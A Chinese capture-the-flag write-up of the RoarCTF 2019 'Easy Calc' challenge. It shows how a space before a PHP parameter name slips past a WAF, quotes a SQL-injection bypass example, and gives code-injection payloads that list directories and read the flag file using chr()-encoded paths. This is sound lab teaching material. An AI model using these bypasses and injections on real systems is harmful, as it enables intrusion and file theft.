### buuoj_[RoarCTF 2019]Easy Calc

首先看看源代码，发现这个

![](https://pic.imgdb.cn/item/610135445132923bf81b4174.jpg)

> $("#content").val() ：
>
>  获取id为content的HTML标签元素的值,是JQuery,   
>
> $("#content")相当于document.getElementById("content");    
>
> $("#content").val()相当于 document.getElementById("content").value;

而且还看到一个calc.php，打开看看

![](https://pic.imgdb.cn/item/6101375e5132923bf820eb33.jpg)

好像是源码。看到很多字符都被过滤了，但是也有很多没过滤

首先试一下读取文件

```
?num=1;var_dump(scandir(‘/’))
```

但是好像报错了。不知道为什么，看了下大佬们的wp,学到了

> ##### PHP的字符串解析特性
>
> 这是别人对PHP字符串解析漏洞的理解，
> 我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
>
> /news.php?%20news[id%00=42"+AND+1=0–
>
> 上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。
>
> HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
>
> 1.删除空白符
>
> 2.将某些字符转换为下划线（包括空格）
>
> 假如waf不允许num变量传递字母：
>
> http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
>
> 那么我们可以在num前加个空格：
>
> http://www.xxx.com/index.php? num = aaaa
>
> 这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。

去掉空格发现还是不行，看了下原来是/被过滤了

用ASCII码替换一下

```
http://node4.buuoj.cn:26527/calc.php? num=1;var_dump(scandir(chr(47)))
```

![](https://pic.imgdb.cn/item/61013a835132923bf829cd67.jpg)

看到flag文件了，用同样的方式读取文件

```
calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

> file_get_contents — 将整个文件读入一个字符串
>
> 如果要打开有特殊字符的 URL （比如说有空格），就需要使用    [urlencode()](https://www.php.net/manual/zh/function.urlencode.php) 进行 URL 编码。

